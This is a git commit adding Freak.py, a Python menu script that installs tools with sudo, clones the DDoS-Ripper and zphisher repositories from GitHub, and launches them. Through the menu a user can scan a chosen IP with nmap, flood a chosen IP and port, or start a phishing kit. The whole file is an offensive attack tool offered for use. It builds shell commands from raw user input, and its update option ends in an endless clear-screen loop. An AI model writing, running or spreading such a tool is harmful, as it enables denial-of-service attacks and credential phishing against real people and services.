18b87ed4beeefc25282e33bba51005020bb7925a
Apex-Arch <inowicka82@gmail.com>
2025-06-14 14:59:58 +0200

    Freak.py

---
+++ Freak.py
@@ -0,0 +1,56 @@
+import os
+import time
+os.system("sudo apt update && sudo apt install -y nmap")
+os.system("sudo apt update && sudo apt install -y git")
+os.system("sudo apt update && sudo apt install -y wget")
+os.system("sudo apt update && sudo apt install -y python")
+os.system("sudo apt update && sudo apt install -y python3")
+os.system("sudo git clone https://github.com/palahsu/DDoS-Ripper.git")
+ddosripper = os.path.join(os.getcwd(), "DDoS-Ripper")
+os.chdir(ddosripper)
+os.system("sudo git clone --depth=1 https://github.com/htr-tech/zphisher.git")
+while True:    
+    os.system("clear")
+    print("███████╗██████╗░███████╗░█████╗░██╗░░██╗")
+    print("██╔════╝██╔══██╗██╔════╝██╔══██╗██║░██╔╝")
+    print("█████╗░░██████╔╝█████╗░░███████║█████═╝░")
+    print("██╔══╝░░██╔══██╗██╔══╝░░██╔══██║██╔═██╗░")
+    print("██║░░░░░██║░░██║███████╗██║░░██║██║░╚██╗")
+    print("╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝")
+    print("                      TOOL MADE BY apexvr_ ON TIKTOK")
+    print("")
+    print("1. Nmap Scan")
+    print("2. DDoS (DDoS Ripper)")
+    print("3. Zphisher")
+    print("4. Update")
+    freakchoice = int(input(">>> "))
+    if freakchoice == 4:
+        os.system("sudo apt update && sudo apt install -y nmap")
+        os.system("clear")
+        os.system("sudo apt update && sudo apt install -y git")
+        os.system("clear")
+        os.system("sudo apt update && sudo apt install -y wget")
+        os.system("clear")
+        os.system("sudo apt update && sudo apt install -y python")
+        os.system("clear")
+        os.system("sudo apt update && sudo apt install -y python3")
+        while True:
+            os.system("clear")
+        break
+    elif freakchoice == 1:
+        IP = input("TARGET IP: ")
+        METHOD = input("SCAN METHOD (sT, sS, Pn...): ")
+        os.system(f"sudo nmap -{METHOD} {IP}")
+        time.sleep(5)
+    elif freakchoice == 2:
+        IPDDOS = input("TARGET IP: ")
+        PORTDDOS = int(input("OPEN PORT: "))
+        print("Press CTRL + C to break")
+        time.sleep(2)
+        os.system(f"python3 DRipper.py -s {IPDDOS} -p {PORTDDOS} -t 443")
+    elif freakchoice == 3:
+        zphisher = os.path.join(os.getcwd(), "zphisher")
+        os.chdir(zphisher)
+        os.system("sudo chmod +x zphisher.sh")
+        os.system("sudo bash zphisher.sh")
+        break
